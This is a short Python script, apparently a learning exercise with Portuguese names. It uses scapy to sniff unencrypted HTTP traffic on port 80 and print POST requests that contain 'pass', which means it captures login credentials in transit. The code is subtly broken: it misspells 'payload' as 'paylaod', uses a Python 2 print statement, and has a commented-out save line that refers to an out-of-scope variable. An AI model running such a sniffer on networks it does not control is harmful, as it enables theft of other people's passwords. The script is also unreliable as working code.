from scapy.all import *

def imprimir_pacote(pacote):
    header = str(pacote[TCP].payload)[0:4]
    if header == 'POST':
        if 'pass' in str(pacote[TCP].paylaod).lower():
            print pacote.show()

sniff(filter='port 80', store=0, prn=imprimir_pacote)

#wrpcap('pacotao.pcap', pacote)